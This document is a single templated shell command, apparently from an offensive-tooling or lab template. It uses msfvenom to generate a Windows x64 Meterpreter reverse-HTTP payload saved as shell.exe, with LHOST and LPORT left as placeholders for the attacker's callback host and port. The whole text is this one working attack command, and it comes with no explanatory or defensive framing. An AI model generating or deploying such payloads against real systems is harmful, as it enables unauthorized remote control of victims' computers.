msfvenom -p windows/x64/meterpreter_reverse_http -f exe -o ./shell.exe LHOST={{ LHOST }} LPORT={{ LPORT }}
